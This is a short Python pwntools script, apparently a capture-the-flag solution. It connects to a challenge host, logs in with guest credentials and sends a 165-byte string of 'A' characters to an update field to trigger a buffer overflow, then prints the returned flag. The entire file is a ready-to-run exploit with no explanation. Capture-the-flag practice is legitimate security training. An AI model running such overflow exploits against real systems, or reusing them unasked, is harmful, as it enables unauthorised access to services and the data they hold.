#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

p = remote('inst-zlur8by3dq.tls.vuln.si', 443, ssl=True)

try:
    p.recvuntil(b'Username: ')
    p.sendline(b'guest')

    p.recvuntil(b'PIN: ')
    p.sendline(b'12345678')

    p.recvuntil(b'Update data: ')
    p.sendline(b'A' * 165)

    # 3. Capture and print the flag
    p.recvuntil(b'Flag: ', drop=True)
    flag = p.recvline().strip()
    print(f"Flag: {flag.decode()}")

except KeyboardInterrupt:
    print("Interrupted by user")
except Exception as e:
    print(f"Exploit failed: {e}")
finally:
    p.close()
